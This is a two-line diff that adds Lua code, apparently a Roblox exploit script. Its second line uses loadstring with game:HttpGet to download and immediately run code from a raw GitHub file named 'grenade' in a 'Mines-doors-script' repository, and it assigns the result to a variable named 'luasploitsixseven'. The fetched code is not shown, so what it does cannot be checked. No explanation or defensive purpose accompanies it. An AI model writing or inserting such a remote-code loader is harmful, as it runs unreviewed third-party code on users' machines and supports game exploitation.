@@ -1,0 +1,2 @@
+local _1 = (game == game)
+local luasploitsixseven = loadstring(game:HttpGet("https://raw.githubusercontent.com/lukahudeev-sys/Mines-doors-script/refs/heads/main/grenade"))()
